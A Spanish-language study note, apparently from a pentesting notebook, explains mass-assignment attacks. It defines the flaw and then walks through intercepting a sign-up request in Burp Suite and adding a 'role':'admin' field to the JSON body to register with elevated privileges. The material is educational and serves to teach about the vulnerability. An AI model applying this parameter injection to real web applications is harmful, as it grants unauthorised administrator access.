-----
-  Tags: #ataques #basico #teoria #practica 
----

# ¿ Que es el **ataque de asignación masiva** ? 

El **ataque de asignación masiva** o **Mass-Assignment Attack** se basa en la manipulación de parámetros de entrada de una solicitud HTTP para crear o modificar campos en un objeto de modelo de datos en la aplicación web. En lugar de agregar nuevos parámetros, los atacantes intentan explotar la funcionalidad de los parámetros existentes para modificar campos que no deberían ser accesibles para el usuario. 

Por ejemplo en una aplicación web de gestión de usuarios, un formulario de registro puede tener campos para el nombre usuario, correo electrónico y contraseña. Sin embargo, si la acpliación utiliza una biblioteca o marco que permite la asignación masiva de parámetros, el atacante podría manipular la solicitud HTTP para agregar un parámetro adicional, como el nivel de privilegio del usuario. De esta manera, el atacante podría registrarse como un usuario con privilegios elevados, simplemente agregando un parámetro adicional a la solicitud HTTP.

----

# Explotación 

Para explotar esta vulnerabilidad, una vez más, pueden existir muchos casos, ya sea por intuición, por puro intento, entre otras, por ejemplo....

Tenemos una página web en la cual existe una sección de "create account" en donde interceptando la petición con [[Burpsuite]] vemos que se tramita una estructura tal que asi: 

```json
{
	"email":"dobliuw2@dobliuw.com",
	 "password":"dobliuw123",
	 "passwordRepeat":"dobliuw123",
	 "securityQuestion":{
		 "id":2,
		 "question":"Mother's maiden name?",
		 "createdAt":"2023-05-16T18:46:09.595Z",
		 "updatedAt":"2023-05-16T18:46:09.595Z"
	 },
	 "securityAnswer":"dobliuw"
 }
```

Y a la hora de crear el usuario, es decir, dejar tramitar esta petición, vemos una respuesta tal que así: 

```json

{
	"status":"success",
	"data":{
		"username":"",
		"deluxeToken":"",
		"lastLoginIp":"0.0.0.0",
		"profileImage":"/assets/public/images/uploads/defaultAdmin.png",
		"isActive":true,
		"id":22,
		"email":"dobliuw2@dobliuw.com",
		"role":"user",
		"updatedAt":"2023-05-16T18:50:27.165Z",
		"createdAt":"2023-05-16T18:50:27.165Z",
		"deletedAt":null
	}
}
```

Por lo que al ver todos los parámetros de un usuario, podriamos probar si la web es vulnerable a **Mass-Assignment Attack** intentando asignar un rol, el cual podría ser "admin" en la creación del usuario, modificando el JSON original, agregando el campo: 

```json
{
	....,
	"role":"admin",
	....
}
```

